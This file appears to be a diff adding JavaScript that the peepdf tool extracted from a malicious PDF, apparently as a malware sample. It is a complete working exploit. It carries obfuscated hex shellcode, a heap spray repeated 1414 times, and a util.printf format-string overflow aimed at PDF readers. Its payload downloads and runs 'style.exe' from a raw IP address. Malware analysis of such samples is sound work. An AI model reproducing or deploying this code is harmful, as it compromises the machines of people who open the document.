@@ -1,0 +1,70 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.Q7NExeR4IXsMp()
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+	function Q7NExeR4IXsMp() {
+	    var LfM3ZbYmf = "http://78.26.179.61/style.exe?new=1&sid=3f0a38083b0a3f0c3e0f326134093d0f3f0f3f0f32043d043600310b&u=i_6_0&spl=p1";
+	    var cEjAhWJ = '';
+
+	    function abrvalg(arg) {
+	        var out = "";
+	        for (var i = 0; i < arg.length; i = i + 4) {
+	            var br1 = parseInt('0x' + arg[i] + arg[i + 1], 16).toString(16);
+	            var br2 = parseInt('0x' + arg[i + 2] + arg[i + 3], 16).toString(16);
+	            if (br2.length == 1) {
+	                br2 = "0" + br2;
+	            };
+	            if (br1.length == 1) {
+	                br1 = "0" + br1;
+	            };
+	            out = out + "%u" + br1 + br2;
+	        }
+	        return out;
+	    }
+
+	    for (i = 0; i < LfM3ZbYmf.length;) {
+	        cEjAhWJ += '%u' + ((i + 1 < LfM3ZbYmf.length) ? LfM3ZbYmf.charCodeAt(i + 1).toString(16) : '00') + LfM3ZbYmf.charCodeAt(i).toString(16);
+	        i = i + 2;
+	    }
+
+	    fxPnLwPoCPF = unescape("" + abrvalg(("9z09x09xx0900feb335rb66c98r0b98001ef33e243e" + "bfaze805xffecfffrf8b7fdf4eefef64efe3af9f" + "6442f39zf64x6ee7erf03ezfeb64efb9036187e1a" + "10z703ef11efefaa66b9zeb7787651107e1ef1f" + "efefaa66bz9e7ca871r05f072defz0defefaa66b" + "9e391870dx37079cef3rbefefaa66zb9ff2e870a" + "960757ef29ezfefaa66arxffbd76f9a2c6615f7a" + "ae806efeeb1ezf9a6664crbebaaexe8564b6f7ba" + ("07b9ef64efef87zbff5d9r9fxcz07807efef66eff").replace(new RegExp(/[zxswqr]/g), "") + "3aa2ax6z42f6c66bfcfaa10rz87efefbfefaa6485" + "fbb6edxba6407zf7ef8eefefraaexc28cfb3efc19" + "1288raexbaf8a97efef9a10z64rcfe3xaaee8564b6" + "f7baarzfx07efef85efb7exz8aaecdccbbc3410bcc" + "f9axbcrbfaa648z5f3b6eabxa6407f7zefccefefef" + "859xa1zr064cfe7aaed8564b6zf7baff07efef85e" + "f64exfffraaee856z4b6f7baef07efefaeefbdb4" + "0eec0xeecr0eec0eecz036cb5eb64bcz0d35bd180" + "f1064bxa64rz03e792b264b9e39c6464d3f19bec" + "97b91c9x964rzeccfdc1ca62642ae2cecdcb9e01" + "9ff511dd5e7xr9b212zeece2af1d1ez0411d49ab1" + "b50a0464b564erccb8932e36464a4zf3b532ece" + "b64xec64b12a2xrdb2zefe71b071011zba10a3bda0a2efa1").replace(new RegExp(/[zxswqr]/g), "")));
+
+	    home = unescape(cEjAhWJ);
+
+	    runnable = fxPnLwPoCPF + home;
+	    skipper = unescape(abrvalg(("0zx505" + "w0r5q0qq5").replace(new RegExp(/[zxswqr]/g), "")));
+
+	    while (skipper.length < 20 + runnable.length) {
+	        skipper += skipper;
+	    }
+
+	    skipper1 = skipper.substring(0, 20 + runnable.length);
+	    skipper2 = skipper.substring(0, skipper.length - 20 - runnable.length);
+
+	    while (skipper2.length < (0x40000 - 20 - runnable.length)) {
+	        skipper2 += skipper2;
+	        skipper2 += skipper1; //skipper2 = skipper2+skipper2+skipper1;
+	    }
+
+	    context = new Array();
+	    ii = -1;
+
+	    while (++ii < 1414) {
+	        context[ii] = skipper2 + runnable;
+	    }
+
+	    var n2m2 = 12;
+	    for (i = 0; i < 18; i++) {
+	        n2m2 = n2m2 + "9";
+	    }
+	    for (i = 0; i < 276; i++) {
+	        n2m2 = n2m2 + "8";
+	    }
+	    var str = "l25k34u35d30u30d30l66";
+	    var fyt = unescape(str.replace(new RegExp(/[lkud]/g), "%"));
+	    var fmck = util;
+	    fmck.printf(fyt, n2m2);
+	};
+
